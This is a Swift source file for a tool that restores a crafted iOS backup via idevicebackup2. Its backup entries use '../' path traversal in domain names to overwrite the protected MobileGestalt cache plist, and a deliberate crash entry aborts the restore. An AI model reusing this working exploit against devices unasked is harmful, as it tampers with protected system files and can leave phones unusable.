import SwiftUI

let logPipe = Pipe()

struct LogView: View {
    @State var log: String = ""
    @State var ran = false
    let willReboot: Bool
    let mobileGestaltData: Data
    var body: some View {
        NavigationView {
            ScrollViewReader { proxy in
                ScrollView {
                    Text(log)
                        .font(.system(size: 12).monospaced())
                        .fixedSize(horizontal: false, vertical: false)
                        .textSelection(.enabled)
                    Spacer()
                        .id(0)
                }
                .onAppear {
                    guard !ran else { return }
                    ran = true
                    
                    logPipe.fileHandleForReading.readabilityHandler = { fileHandle in
                        let data = fileHandle.availableData
                        if !data.isEmpty, let logString = String(data: data, encoding: .utf8) {
                            log.append(logString)
                            proxy.scrollTo(0)
                        }
                    }
                    
                    DispatchQueue.global(qos: .background).async {
                        performRestore()
                    }
                }
            }
        }
        .navigationTitle("Log output")
    }
    
    init(mobileGestaltURL: URL, reboot: Bool) {
        setvbuf(stdout, nil, _IOLBF, 0) // make stdout line-buffered
        setvbuf(stderr, nil, _IONBF, 0) // make stderr unbuffered
        
        // create the pipe and redirect stdout and stderr
        dup2(logPipe.fileHandleForWriting.fileDescriptor, fileno(stdout))
        dup2(logPipe.fileHandleForWriting.fileDescriptor, fileno(stderr))
        
        mobileGestaltData = try! Data(contentsOf: mobileGestaltURL)
        willReboot = reboot
    }
    
    func performRestore() {
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            print("Invalid device count: \(deviceList.count)")
            return
        }
        
        let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let folder = documentsDirectory.appendingPathComponent(deviceList.first!, conformingTo: .data)
        
        do {
            try? FileManager.default.removeItem(at: folder)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: false)
            
            let backupFiles: [BackupFile] = [
                Directory(path: "", domain: "RootDomain", owner: 501, group: 501),
                Directory(path: "Library", domain: "RootDomain", owner: 501, group: 501),
                Directory(path: "Library/Preferences", domain: "RootDomain", owner: 501, group: 501),
                ConcreteFile(path: "Library/Preferences/temp", domain: "RootDomain", contents: mobileGestaltData, owner: 501, group: 501),
                Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/", owner: 501, group: 501),
                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", contents: mobileGestaltData, owner: 501, group: 501),
                Directory(path: "", domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp", owner: 501, group: 501),
                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()),
            ]
            
            let mbdb = Backup(files: backupFiles)
            try mbdb.writeTo(directory: folder)
            
            // Restore now
             var restoreArgs = [
             "idevicebackup2",
             "-n", "restore", "--system",
             documentsDirectory.path(percentEncoded: false)
             ]
            if !willReboot {
                restoreArgs.insert("--no-reboot", at: 3)
            }
             print("Executing args: \(restoreArgs)")
             var argv = restoreArgs.map{ strdup($0) }
             let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
             print("idevicebackup2 exited with code \(result)")
             logPipe.fileHandleForReading.readabilityHandler = nil
        } catch {
            print(error.localizedDescription)
            return
        }
    }
}
